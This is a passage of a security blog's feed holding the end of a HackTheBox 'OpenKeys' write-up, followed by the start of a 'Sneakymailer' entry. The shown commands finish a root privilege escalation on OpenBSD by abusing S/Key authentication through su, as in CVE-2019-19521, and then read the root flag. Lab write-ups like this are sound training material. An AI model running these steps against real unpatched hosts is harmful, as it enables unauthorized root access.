+&lt;span class="code-line"&gt;openkeys$ chmod 0600 /etc/skey/root&lt;/span&gt;
+&lt;span class="code-line"&gt;openkeys$ env -i TERM=vt220 su -l -a skey&lt;/span&gt;
+&lt;span class="code-line"&gt;otp-md5 99 obsd91335&lt;/span&gt;
+&lt;span class="code-line"&gt;S/Key Password: [EGG LARD GROW HOG DRAG LAIN]&lt;/span&gt;
+&lt;span class="code-line"&gt;openkeys# id&lt;/span&gt;
+&lt;span class="code-line"&gt;uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)&lt;/span&gt;
+&lt;span class="code-line"&gt;openkeys# cat /root/root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;f3a553b1697050ae885e7c02dbfc6efa&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;This box was quit easy once the &lt;a href="https://www.qualys.com/2019/12/04/cve-2019-19521/authentication-vulnerabilities-openbsd.txt"&gt;qualys article&lt;/a&gt;
+was found. I was hoping for more specific OpenBSD content. Nevertheless this
+was a fun box to root. I will probably recommend this box to beginners.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="OpenBSD"></category><category term="CVE"></category></entry><entry><title>HTB: Sneakymailer</title><link href="https://maggick.fr/2020/12/htb-sneakymailer.html" rel="alternate"></link><published>2020-12-03T07:20:00+01:00</published><updated>2020-12-03T07:20:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-12-03:/2020/12/htb-sneakymailer.html</id><summary type="html">&lt;p&gt;&lt;img alt="Sneakymailer Card" class="align-left" src="/media/2020.12/sneakymailer_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This box is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/262"&gt;Sneakymailer&lt;/a&gt; publish on
 July 11, 2020 by
